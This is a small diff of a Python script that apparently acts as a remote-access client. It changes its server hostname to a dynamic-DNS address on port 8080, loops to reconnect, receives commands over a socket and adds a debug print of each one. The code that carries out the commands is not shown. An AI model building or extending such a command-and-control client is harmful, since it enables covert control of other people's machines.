@@ -11,7 +11,7 @@ import requests
 import tempfile
 import os
 
-SERVER = "posydon.ddns.net"
+SERVER = "p0syd0n.ddns.net"
 #SERVER = "ws.ifelse.io"
 PORT = 8080
 FILEPORT = 8081
@@ -120,6 +120,7 @@ while True: 		# Infinite loop to keep trying to connect
     try:
       while True:
         command = s.recv(1024).decode()
+        print("CMMAND: "+command)
         if not command:
           break
         
